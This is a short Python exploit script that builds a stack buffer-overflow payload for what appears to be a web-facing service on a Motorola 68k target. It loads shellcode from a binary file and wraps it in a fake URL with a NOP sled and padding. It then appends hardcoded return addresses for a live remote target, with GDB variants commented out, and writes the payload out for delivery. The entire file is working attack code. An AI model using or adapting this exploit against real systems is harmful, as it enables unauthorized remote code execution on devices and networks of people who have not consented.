# File: www_payload.py
# Author: draco  -  jtang613@gmail.com
#

import sys
import struct

# Load shellcode from binary
with open('www_shellcode', 'rb') as f:
    code = f.read()
start = code.index('\x48\xef\x28\x18')
stop  = code.rindex('\x70\x00\x4e\x5e')
sys.stderr.write('Found shellcode at: 0x{:04x} - 0x{:04x}\n'.format(start,stop))

# Deliver shellcode
p = 'http://aaaaaaaa' + '\x4e\x71' * 40
p += code[start:stop]
p += '\x4e\x71' * (260-(len(p)))

# Target standalone / live remote
p += struct.pack('>I', 0x03fff8a8)
p += struct.pack('>I', 0x03fff68c)

# Target running under GDB
#p += struct.pack('>I', 0x03fff680)
#p += struct.pack('>I', 0x03fff44c)

bytes = ''.join(['%02x'%ord(x) for x in p])
sys.stderr.write('Sending {} bytes:\n{}\n'.format(len(bytes)/2,bytes))
sys.stdout.write(p)

